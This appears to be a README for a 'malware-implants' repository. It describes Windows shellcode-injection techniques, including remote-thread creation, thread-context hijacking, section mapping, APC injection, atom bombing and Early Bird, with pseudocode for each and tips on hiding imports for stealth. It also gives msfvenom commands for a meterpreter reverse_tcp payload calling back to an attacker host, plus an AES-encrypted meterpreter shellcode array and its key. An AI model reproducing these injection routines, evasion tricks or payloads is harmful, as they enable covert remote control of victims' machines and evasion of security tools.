# malware-implants


# I. PEMadness chapter

## 1. CustomGetProcAndModHandle
	Implementation of custom functions GetProcAddress and GetModuleHandle. Payload: aes encoded meterpreter. No other function names are obfuscated. Functions used:
	- pVirtualAlloc
	- pRtlMoveMemory
	- VirtualProtect
	- CreateThread
	- WaitForSingleObject

## 2.  No import table 
	Code is just like 1. but compilation directives makes IAT empty:
	```c
	#pragma comment(linker, "/entry:WinMain")
	```
	Above basically sets main function as entry point what prevents side loading. 

	Additionally VirtualProtect, CreateThread and WaitForSingleObject functions are called with custom GetProcAddress and GetModuleHandle. 
	To make it more stealth it is possible to obfuscate function names (example mentioned below)
	To get rid of import table when custom GetModuleHandle and GetProcAddress fails *it is possible to resolve standard GetModuleHandle and GetProcAddress functions and use this handler to resolve the rest of them.*

#  II. Code Injectuin 
TO ALLOW TESTING MULTIPLE TIMES WITHOUT CAUSE WINDOWS UNSTABILITY INJECTION IS MADE TO NOTEPAD.EXE PROCESS. 

## 3. Classic variants 
Below used functions are listed:
- VirtualAllocEx
- WriteProcessMemory
- CreateRemoteThread
- NtCreateThreadEx
- RtlCreateUserThread

### 3.1 Classiv variant with 
	It allocates memory in remote process, copy code to that memory and executes code into *notepad.exe* process. If notepad is not run it returns 0. Simple technique, no obfuscation in this example.

## 3.2 Extended variant with NtCreateThreadEx
	Just like above but inject function uses NtCreateThreadEx.
	
## 3.3 Extended variant with RtlCreateUserThread
	Just like above but inject function uses RtlCreateUserThread.
	
	- Algorithm pseudocode:
```
	// 1. open remote process
	hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)

	// 2. allocate memory buffer in remote process to store shellcode
	pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

	// 3. write shellcode in remote memory buffer
			WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

	// 4. execute shellcode in remote process via one of following call variants 
	CreateRemoteThread(hRemoteProcess,..., pRemoteCode, ...)      // classic API
	RtlCreateUserThread(hRemoteProcess, ..., pRemoteCode, ..., &hThread, ...)    // RtlCreateUserThread from ntdll.dll
	NtCreateThreadEx(&hThread,..., hRemoteProcess, pRemoteCode,...)        // NtCreateThreadEx from ntdll.dll
```


## 4. Thread Context
- Technique used for triggering shellcode execution.
- Key API functions:
 OpenThread
 Thread32Next
 SuspendThread
 SetThreadContext
 ResumeThread
 
- Algorithm
```c
// 1. open remote process and one of its threads
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. suspend the target thread and retrieve its full context
CONTEXT ctx
ctx.ContextFlags = CONTEXT_FULL
SuspendThread(hThread)
GetThreadContext(hThread, &ctx)

// 5. change the instruction pointer to point to our shellcode
ctx.Eip = pRemoteCode      // 32-bit process
ctx.Rip = pRemoteCode      // 64-bit process

// 6. set new context on the thread and resume it
SetThreadContext(hThread, &ctx)
ResumeThread(hThread)
```

## 5. Sections and views

Key functions:
- GetCurrentProcess
- NtCreateSection
- NtMapViewOfSection
- RtlCreateUserThread

```c
// 1. create new page-file-backed section (last parameter = NULL)
NtCreateSection(&hSection, ..., &payload_len, PAGE_EXECUTE_READWRITE, ..., NULL)

// 2. create section view in a local process
NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, ..., &payload_len, ...)

// 3. write shellcode into the section
memcpy(pLocalView, payload, payload_len)

// 4. create section view in a remote process (target)
NtMapViewOfSection(hSection, RemoteProc, &pRemoteView, ..., &payload_len, ..., PAGE_EXECUTE_READ)

// 5. execute shellcode in a remote process
RtlCreateUserThread(RemoteProc, ..., pRemoteView, 0, &hThread, &cid)
```

## 6.1 Asynchronious Procedure Calls - SINGLE THREAD INJECTION
It injects a shellcode to remote thread then schedules an object in APC queue. After sleep or wait-like function is invoke in targer program (it enters to alertable state) there is a chance that shellcode will be executed. 

```c
// 1. open handles to remote process and thread
hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS,..., RemoteProcessID)
hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(hRemoteProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(hRemoteProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. execute shellcode in remote process by scheduling APC object in the thread's APC queue
QueueUserAPC(pRemoteCode, hThread, NULL)

// 5. ... and wait till the hThread enters alertable state (which is not guaranteed).
```

## 6.2 Asynchronious Procedure Calls - MASS THREAD INJECTION
It injects a shellcode to remote thread then schedules an object in apc queue FOR ALL FOUND THREDS FOUND IN THE PROCESS. It results opening nultiple shells and makes A LOT OF NOISE. 
- process is almost always crashed 
- migrarion to another process is crucial to sustain shell
- migration not implemented it code - you have to arm payload to do it automatically

## 6.3  Asynchronious Procedure Calls - Atom bombing 
"Atom bombing" is a technique used by attackers to inject malicious code into legitimate processes by leveraging Windows atom tables. These tables, inherent to Windows operating systems, allow applications to store and retrieve data strings. When combined with searching for threads in an "alertable state", attackers can subsequently inject code into the Asynchronous Procedure Call (APC) queue of a target process, bypassing many traditional security measures.

## 6.4  Asynchronious Procedure Calls - Atom bombing 
Thread state is detetcted by reading the context of remote thread and examining the control and integer registers. Code seeks for threads with alert state:
Kod przedstawia narzędzie do inżynierii wstecznej oraz do penetracji systemu. Oto opis:

- `IsAlertable` weryfikuje, czy dany wątek jest w stanie "alertable" na podstawie kontekstu wątku i adresu aktualnie wykonywanej funkcji. Koncepcyjnie funkcja `IsAlertable` sprawdza, czy dany wątek znajduje się w stanie, w którym może otrzymywać asynchroniczne wywołania procedury (APC). Jeśli wątek jest w takim stanie i czeka na pewne zdarzenie, może zostać przerwany przez APC.
9. Funkcja `ThreadProc` wykonuje różne funkcje systemowe, które mogą być alertowalne, 
10. Funkcja `find_alertable_thread2` wyszukuje wątki, które są alertowalne.
11. Kiedy wątek alertowalny zostanie znaleziony, można do niego wstrzyknąć kod.

Kod ten jest narzędziem do wyszukiwania wątków, które są w stanie "alertowalnym", a następnie wykorzystania tego stanu do wstrzykiwania kodu. Zaleca się ostrożne korzystanie z tego kodu, ponieważ ma on potencjał do naruszania bezpieczeństwa systemu.



## 7. Early Bird 
It creates suspend process (notepad.exe in the example), allocates memory in that process and writes shellcode to that memory space. Than QueueUserAPC is called to put thread in gueue. 
EarlyBird is a technique that allows to trigger that shellcode in sacrificial remote process. (?) 
When thread is run  undocumented NtTestAlert/ZwTestAlert function is called. This function empties queue and because of this it triggers APC executing shellcode payload. 
```c
// 1. create new process in suspended state
PROCESS_INFORMATION pi
CreateProcessA(0, "notepad.exe", ..., CREATE_SUSPENDED, ..., &pi)

// 2. allocate memory buffer in remote process to store shellcode
pRemoteCode = VirtualAllocEx(pi.hProcess,..., BufferSize,..., PAGE_EXECUTE_READWRITE)

// 3. write shellcode in remote memory buffer
WriteProcessMemory(pi.hProcess, pRemoteCode, Shellcode, ShellcodeSize,...)

// 4. execute shellcode in remote process via APC
QueueUserAPC(pRemoteCode, pi.hThread, NULL)

// 5. resume the main thread in remote process -> shellcode gets executed
ResumeThread(pi.hThread)
```



## Helpers functions
	- aes.py - takes raw payload and aes encypts it. The output of used key and payload is printed on screeen. No files are written to disc. 


## Generation of shellcode
1. msfvenom
```
msfvenom -a x64 -p windows/x64/messagebox TITLE="Successfully injected" TEXT="hello from Test IT" -f raw -o msgbox64_test.bin
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.68 LPORT=8080 -f raw -o shellcode.raw
```
2. encryption
- copy output 
```
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.68 LPORT=8080 -f raw -o met64.raw
unsigned char payload[] = { 0x30, 0xc8, 0xe4, 0xf4, 0x84, 0x77, 0xd2, 0x2b, 0x18, 0x63, 0x99, 0x4f, 0x56, 0xef, 0x85, 0x13, 0x18, 0x36, 0xa1, 0xdd, 0x7c, 0x5a, 0x2, 0x41, 0x9a, 0x9f, 0x1f, 0xd2, 0x61, 0x5f, 0x5e, 0x41, 0x24, 0x8a, 0xb4, 0xb2, 0xb3, 0x27, 0x44, 0xa, 0x3a, 0xd3, 0xfe, 0x1f, 0x45, 0x78, 0x30, 0xde, 0x5b, 0xc, 0x21, 0x1b, 0x91, 0x7d, 0xeb, 0x52, 0xfe, 0x34, 0x19, 0xc6, 0xdd, 0x7b, 0xd7, 0x17, 0xc5, 0xb, 0xc9, 0xa7, 0x21, 0x5b, 0xf2, 0x2, 0x71, 0x6, 0x82, 0x81, 0xc2, 0xfa, 0x4, 0x1, 0x95, 0x3b, 0x76, 0x62, 0xa8, 0xed, 0x32, 0x31, 0x3c, 0xe6, 0x21, 0x14, 0x19, 0x3f, 0x2e, 0x1a, 0x46, 0xc1, 0xd1, 0xf9, 0xe4, 0x3d, 0x1a, 0xc6, 0x28, 0xa0, 0xc6, 0x87, 0x2d, 0x24, 0x77, 0x1f, 0xe1, 0x32, 0x24, 0xdb, 0x37, 0x43, 0xad, 0x94, 0xf5, 0xa4, 0x4e, 0x3d, 0x28, 0x8a, 0x73, 0x7c, 0xb8, 0x5e, 0xb4, 0x21, 0x47, 0x43, 0xe9, 0x70, 0x40, 0xe3, 0x69, 0x6a, 0x9, 0x2b, 0xe5, 0xe1, 0x30, 0x1f, 0x33, 0x73, 0xaa, 0xf5, 0x71, 0x60, 0x22, 0xaa, 0xda, 0x23, 0x8c, 0xf3, 0x6e, 0x60, 0x10, 0x85, 0x74, 0x2d, 0xc, 0x64, 0xd2, 0xc4, 0xfc, 0xe6, 0xf7, 0xdd, 0xd2, 0x4f, 0xd9, 0xb0, 0x48, 0x95, 0x2d, 0xe1, 0x7c, 0x97, 0x44, 0x68, 0x6d, 0x73, 0xb2, 0x20, 0x24, 0xfe, 0x4e, 0x39, 0x70, 0x21, 0xec, 0xe, 0x9e, 0x1e, 0xe6, 0xc, 0x2e, 0xfc, 0xb5, 0x48, 0x6f, 0xc8, 0x31, 0xc, 0x50, 0x2, 0x6e, 0x5e, 0x56, 0xd7, 0x71, 0xdc, 0x61, 0xc3, 0x4d, 0x81, 0xd2, 0xe4, 0xd6, 0x17, 0xce, 0x59, 0x8b, 0x66, 0x5f, 0x9c, 0x1a, 0x75, 0xc4, 0x31, 0xfc, 0xf3, 0x5a, 0x50, 0x91, 0xa2, 0x9c, 0x6c, 0xf6, 0xbd, 0x45, 0x58, 0x34, 0x3b, 0xfb, 0x3a, 0xff, 0x38, 0x68, 0xaf, 0x7c, 0xe1, 0x64, 0xe, 0x20, 0x1b, 0xf6, 0x63, 0xb1, 0xa2, 0x62, 0xbb, 0x7d, 0xde, 0xc0, 0x7e, 0xb, 0xed, 0xd5, 0x88, 0x1c, 0x48, 0xc2, 0xc8, 0x2d, 0xaf, 0x6f, 0x71, 0x25, 0xa8, 0x7, 0x6e, 0x30, 0xee, 0x73, 0x85, 0xb4, 0xcf, 0x8c, 0x88, 0x90, 0x8, 0x4a, 0x21, 0x2f, 0x23, 0xfd, 0xfb, 0x88, 0x13, 0x6c, 0x1e, 0x30, 0xf0, 0x84, 0x4, 0x13, 0x10, 0xbe, 0xbe, 0x1c, 0x4b, 0x3e, 0x1, 0xa0, 0x61, 0x8d, 0x17, 0x57, 0xb1, 0xa, 0x83, 0x21, 0x8e, 0x98, 0x6e, 0x2d, 0x5b, 0x7a, 0xeb, 0x2f, 0x44, 0x9b, 0x69, 0x1f, 0xf8, 0x8a, 0x35, 0x63, 0x4f, 0xe, 0xa2, 0x0, 0xf7, 0x86, 0xff, 0x9e, 0x3, 0x8d, 0x49, 0xa7, 0x2b, 0xc8, 0x95, 0x3e, 0xfc, 0xc8, 0x7d, 0xd2, 0x10, 0xa0, 0xb2, 0xde, 0x2e, 0xd8, 0x37, 0x44, 0x91, 0x53, 0x8c, 0xf3, 0x7d, 0x1, 0x81, 0x91, 0x8a, 0x56, 0x4b, 0xd5, 0xf9, 0xf1, 0x28, 0xad, 0xfe, 0xa6, 0xf1, 0xf, 0xa3, 0x78, 0x79, 0x13, 0xa9, 0xde, 0xb, 0x57, 0xd9, 0x76, 0xce, 0x22, 0xc6, 0x15, 0x95, 0x5f, 0x1b, 0xee, 0xf7, 0x72, 0x32, 0x34, 0x27, 0xc, 0x39, 0x57, 0x2, 0x4f, 0xb0, 0x84, 0x7c, 0x69, 0x2e, 0xec, 0x69, 0xe, 0xb8, 0x20, 0xbb, 0x7e, 0x9b, 0x47, 0x76, 0x7e, 0x7, 0x97, 0xad, 0x44, 0x6d, 0xfe, 0x9c, 0x98, 0x51, 0xbd, 0x23, 0xf4, 0x44, 0xd5, 0x25, 0xbd, 0x89, 0xb4, 0x5f, 0x2a, 0xf9, 0x73, 0xd9, 0x3d, 0x4c, 0x8e, 0x7, 0x55, 0x96, 0xae, 0x4f, 0x10, 0xe0, 0x9b, 0x67, 0x81, 0xab, 0xd8, 0xe7, 0xa9, 0x14, 0x65, 0x0, 0x52, 0xc3, 0xa3, 0xbf, 0x96, 0x87, 0x9a, 0xc2, 0x15, 0xe0, 0xdc, 0x2f, 0xa4, 0x1e, 0xe, 0x7b, 0xa3, 0x6d, 0x26, 0x7d, 0x57, 0xd9, 0x55, 0x9c, 0x36, 0xbc, 0x36, 0xab, 0x5, 0xd5, 0xb7, 0xb2, 0xb0, 0xed };

unsigned char key[] = { 0x5e, 0xc9, 0x30, 0xb8, 0xb9, 0xdc, 0x54, 0x84, 0x43, 0xc9, 0xf6, 0xb1, 0x1, 0x1c, 0x9f, 0xc4 };

```
- take above output and fill key and payload in desired implant.cpp 


